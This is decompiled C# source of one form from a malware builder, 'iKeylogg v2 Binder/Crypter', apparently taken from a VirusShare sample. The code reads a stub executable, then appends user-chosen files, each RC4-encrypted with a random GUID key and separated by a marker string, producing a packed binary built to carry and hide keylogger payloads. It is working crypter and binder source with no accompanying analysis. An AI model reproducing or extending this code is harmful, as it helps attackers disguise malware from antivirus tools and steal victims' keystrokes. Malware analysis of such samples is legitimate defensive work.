// Decompiled with JetBrains decompiler
// Type: iKeylogg_v_2._0.Form3
// Assembly: iKeylogg v2, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 78503FFA-555C-4BC6-896F-5622120BF4EC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Constructor.MSIL.Logger.v-8daacbbea0563990816926718ebd57f03f257308584d6e6620e3461cdff7be60.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace iKeylogg_v_2._0
{
  [DesignerGenerated]
  public class Form3 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("ListBox1")]
    private ListBox _ListBox1;
    [AccessedThroughProperty("Stub")]
    private TextBox _Stub;
    [AccessedThroughProperty("Output")]
    private TextBox _Output;
    [AccessedThroughProperty("Panel1")]
    private Panel _Panel1;
    [AccessedThroughProperty("Button2")]
    private Button _Button2;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    [AccessedThroughProperty("button1")]
    private Button _button1;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("RemoveLast")]
    private Button _RemoveLast;
    [AccessedThroughProperty("AddFile")]
    private Button _AddFile;
    private const string filesplit = "#@Ijl9MsxN!#t^6";
    private string finalfile;

    [DebuggerNonUserCode]
    static Form3()
    {
    }

    public Form3()
    {
      this.Load += new EventHandler(this.Form1_Load);
      lock (Form3.__ENCList)
        Form3.__ENCList.Add(new WeakReference((object) this));
      this.finalfile = "";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form3));
      this.ListBox1 = new ListBox();
      this.Stub = new TextBox();
      this.Output = new TextBox();
      this.Panel1 = new Panel();
      this.Button2 = new Button();
      this.Label2 = new Label();
      this.button1 = new Button();
      this.Label1 = new Label();
      this.RemoveLast = new Button();
      this.AddFile = new Button();
      this.Panel1.SuspendLayout();
      this.SuspendLayout();
      this.ListBox1.BackColor = SystemColors.InactiveBorder;
      this.ListBox1.Dock = DockStyle.Fill;
      this.ListBox1.FormattingEnabled = true;
      ListBox listBox1_1 = this.ListBox1;
      Point point1 = new Point(0, 0);
      Point point2 = point1;
      listBox1_1.Location = point2;
      this.ListBox1.Name = "ListBox1";
      ListBox listBox1_2 = this.ListBox1;
      Size size1 = new Size(612, 212);
      Size size2 = size1;
      listBox1_2.Size = size2;
      this.ListBox1.TabIndex = 1;
      this.Stub.Cursor = Cursors.Hand;
      TextBox stub1 = this.Stub;
      point1 = new Point(75, 16);
      Point point3 = point1;
      stub1.Location = point3;
      this.Stub.Name = "Stub";
      TextBox stub2 = this.Stub;
      size1 = new Size(176, 20);
      Size size3 = size1;
      stub2.Size = size3;
      this.Stub.TabIndex = 7;
      this.Stub.Text = "Click to browse..";
      this.Output.Cursor = Cursors.Hand;
      TextBox output1 = this.Output;
      point1 = new Point(75, 41);
      Point point4 = point1;
      output1.Location = point4;
      this.Output.Name = "Output";
      TextBox output2 = this.Output;
      size1 = new Size(176, 20);
      Size size4 = size1;
      output2.Size = size4;
      this.Output.TabIndex = 5;
      this.Output.Text = "Click to Save..";
      this.Panel1.Controls.Add((Control) this.Button2);
      this.Panel1.Controls.Add((Control) this.Stub);
      this.Panel1.Controls.Add((Control) this.Label2);
      this.Panel1.Controls.Add((Control) this.Output);
      this.Panel1.Controls.Add((Control) this.button1);
      this.Panel1.Controls.Add((Control) this.Label1);
      this.Panel1.Controls.Add((Control) this.RemoveLast);
      this.Panel1.Controls.Add((Control) this.AddFile);
      this.Panel1.Dock = DockStyle.Bottom;
      Panel panel1_1 = this.Panel1;
      point1 = new Point(0, 130);
      Point point5 = point1;
      panel1_1.Location = point5;
      this.Panel1.Name = "Panel1";
      Panel panel1_2 = this.Panel1;
      size1 = new Size(612, 86);
      Size size5 = size1;
      panel1_2.Size = size5;
      this.Panel1.TabIndex = 7;
      this.Button2.Font = new Font("Trebuchet MS", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Button2.ForeColor = SystemColors.ControlText;
      Button button2_1 = this.Button2;
      point1 = new Point(425, 16);
      Point point6 = point1;
      button2_1.Location = point6;
      this.Button2.Name = "Button2";
      Button button2_2 = this.Button2;
      size1 = new Size(77, 33);
      Size size6 = size1;
      button2_2.Size = size6;
      this.Button2.TabIndex = 8;
      this.Button2.Text = "Clear List";
      this.Button2.UseVisualStyleBackColor = true;
      this.Label2.AutoSize = true;
      this.Label2.Font = new Font("Trebuchet MS", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Label2.ForeColor = Color.Red;
      Label label2_1 = this.Label2;
      point1 = new Point(12, 16);
      Point point7 = point1;
      label2_1.Location = point7;
      this.Label2.Name = "Label2";
      Label label2_2 = this.Label2;
      size1 = new Size(41, 22);
      Size size7 = size1;
      label2_2.Size = size7;
      this.Label2.TabIndex = 6;
      this.Label2.Text = "Stub";
      this.button1.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.button1.ForeColor = SystemColors.ActiveCaptionText;
      this.button1.Image = (Image) componentResourceManager.GetObject("button1.Image");
      this.button1.ImageAlign = ContentAlignment.BottomCenter;
      Button button1_1 = this.button1;
      point1 = new Point(519, 2);
      Point point8 = point1;
      button1_1.Location = point8;
      this.button1.Name = "button1";
      Button button1_2 = this.button1;
      size1 = new Size(85, 78);
      Size size8 = size1;
      button1_2.Size = size8;
      this.button1.TabIndex = 3;
      this.button1.Text = "Go!";
      this.button1.TextAlign = ContentAlignment.TopCenter;
      this.button1.UseVisualStyleBackColor = true;
      this.Label1.AutoSize = true;
      this.Label1.Font = new Font("Trebuchet MS", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Label1.ForeColor = Color.Red;
      Label label1_1 = this.Label1;
      point1 = new Point(11, 40);
      Point point9 = point1;
      label1_1.Location = point9;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(64, 22);
      Size size9 = size1;
      label1_2.Size = size9;
      this.Label1.TabIndex = 4;
      this.Label1.Text = "Save As";
      this.RemoveLast.Font = new Font("Trebuchet MS", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.RemoveLast.ForeColor = SystemColors.ControlText;
      Button removeLast1 = this.RemoveLast;
      point1 = new Point(342, 16);
      Point point10 = point1;
      removeLast1.Location = point10;
      this.RemoveLast.Name = "RemoveLast";
      Button removeLast2 = this.RemoveLast;
      size1 = new Size(77, 33);
      Size size10 = size1;
      removeLast2.Size = size10;
      this.RemoveLast.TabIndex = 2;
      this.RemoveLast.Text = "Remove Last";
      this.RemoveLast.UseVisualStyleBackColor = true;
      this.AddFile.Font = new Font("Trebuchet MS", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.AddFile.ForeColor = SystemColors.ControlText;
      Button addFile1 = this.AddFile;
      point1 = new Point(257, 16);
      Point point11 = point1;
      addFile1.Location = point11;
      this.AddFile.Name = "AddFile";
      Button addFile2 = this.AddFile;
      size1 = new Size(79, 33);
      Size size11 = size1;
      addFile2.Size = size11;
      this.AddFile.TabIndex = 1;
      this.AddFile.Text = "Add File";
      this.AddFile.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(612, 216);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Panel1);
      this.Controls.Add((Control) this.ListBox1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Name = nameof (Form3);
      this.Text = "iKeylogg v2 Binder/Crypter By MC";
      this.Panel1.ResumeLayout(false);
      this.Panel1.PerformLayout();
      this.ResumeLayout(false);
    }

    internal virtual ListBox ListBox1
    {
      [DebuggerNonUserCode] get => this._ListBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ListBox1_SelectedIndexChanged);
        if (this._ListBox1 != null)
          this._ListBox1.SelectedIndexChanged -= eventHandler;
        this._ListBox1 = value;
        if (this._ListBox1 == null)
          return;
        this._ListBox1.SelectedIndexChanged += eventHandler;
      }
    }

    internal virtual TextBox Stub
    {
      [DebuggerNonUserCode] get => this._Stub;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TextBox2_Click);
        if (this._Stub != null)
          this._Stub.Click -= eventHandler;
        this._Stub = value;
        if (this._Stub == null)
          return;
        this._Stub.Click += eventHandler;
      }
    }

    internal virtual TextBox Output
    {
      [DebuggerNonUserCode] get => this._Output;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TextBox1_Click);
        if (this._Output != null)
          this._Output.Click -= eventHandler;
        this._Output = value;
        if (this._Output == null)
          return;
        this._Output.Click += eventHandler;
      }
    }

    internal virtual Panel Panel1
    {
      [DebuggerNonUserCode] get => this._Panel1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Panel1 = value;
    }

    internal virtual Button Button2
    {
      [DebuggerNonUserCode] get => this._Button2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
        if (this._Button2 != null)
          this._Button2.Click -= eventHandler;
        this._Button2 = value;
        if (this._Button2 == null)
          return;
        this._Button2.Click += eventHandler;
      }
    }

    internal virtual Label Label2
    {
      [DebuggerNonUserCode] get => this._Label2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label2 = value;
    }

    internal virtual Button button1
    {
      [DebuggerNonUserCode] get => this._button1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.button1_Click);
        if (this._button1 != null)
          this._button1.Click -= eventHandler;
        this._button1 = value;
        if (this._button1 == null)
          return;
        this._button1.Click += eventHandler;
      }
    }

    internal virtual Label Label1
    {
      [DebuggerNonUserCode] get => this._Label1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual Button RemoveLast
    {
      [DebuggerNonUserCode] get => this._RemoveLast;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RemoveLast_Click);
        if (this._RemoveLast != null)
          this._RemoveLast.Click -= eventHandler;
        this._RemoveLast = value;
        if (this._RemoveLast == null)
          return;
        this._RemoveLast.Click += eventHandler;
      }
    }

    internal virtual Button AddFile
    {
      [DebuggerNonUserCode] get => this._AddFile;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AddFile_Click);
        if (this._AddFile != null)
          this._AddFile.Click -= eventHandler;
        this._AddFile = value;
        if (this._AddFile == null)
          return;
        this._AddFile.Click += eventHandler;
      }
    }

    public string XorString(string message, string password)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = password.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = password.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      location1 = 1;
      while (location1 <= message.Length)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }

    public string ReadFile(string filename)
    {
      FileSystem.FileOpen(5, filename, OpenMode.Binary, OpenAccess.Read);
      string str = Strings.Space(checked ((int) FileSystem.LOF(5)));
      FileSystem.FileGet(5, ref str);
      FileSystem.FileClose(5);
      return str;
    }

    public void WriteFile(string filename, string data)
    {
      FileSystem.FileOpen(1, filename, OpenMode.Binary, OpenAccess.ReadWrite);
      FileSystem.FilePut(1, data, -1L, false);
      FileSystem.FileClose(1);
    }

    private void AddFile_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      if (openFileDialog.ShowDialog() != DialogResult.OK)
        return;
      this.ListBox1.Items.Add((object) openFileDialog.FileName);
    }

    private void RemoveLast_Click(object sender, EventArgs e)
    {
      if (this.ListBox1.Items.Count == 0)
        return;
      this.ListBox1.Items.RemoveAt(checked (this.ListBox1.Items.Count - 1));
    }

    private void TextBox1_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
      if (saveFileDialog.ShowDialog() != DialogResult.OK)
        return;
      this.Output.Text = saveFileDialog.FileName;
    }

    private void TextBox2_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      if (openFileDialog.ShowDialog() != DialogResult.OK)
        return;
      this.Stub.Text = openFileDialog.FileName;
    }

    private void button1_Click(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.Output.Text, "", false) == 0 | Operators.CompareString(this.Stub.Text, "", false) == 0 | this.ListBox1.Items.Count == 0)
      {
        int num1 = (int) Interaction.MsgBox((object) "Error: You must fill in all fields", MsgBoxStyle.Critical);
      }
      else
      {
        this.finalfile += this.ReadFile(this.Stub.Text);
        string password = Guid.NewGuid().ToString();
        this.finalfile += "#@Ijl9MsxN!#t^6";
        this.finalfile += password;
        int num2 = checked (this.ListBox1.Items.Count - 1);
        int index = 0;
        while (index <= num2)
        {
          this.finalfile += "#@Ijl9MsxN!#t^6";
          this.finalfile += Path.GetExtension(Conversions.ToString(this.ListBox1.Items[index]));
          this.finalfile += this.XorString(this.ReadFile(Conversions.ToString(this.ListBox1.Items[index])), password);
          checked { ++index; }
        }
        this.WriteFile(this.Output.Text, this.finalfile);
        this.finalfile = "";
      }
    }

    private void Button2_Click(object sender, EventArgs e) => this.ListBox1.Items.Clear();

    private void ListBox1_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void Form1_Load(object sender, EventArgs e)
    {
    }
  }
}
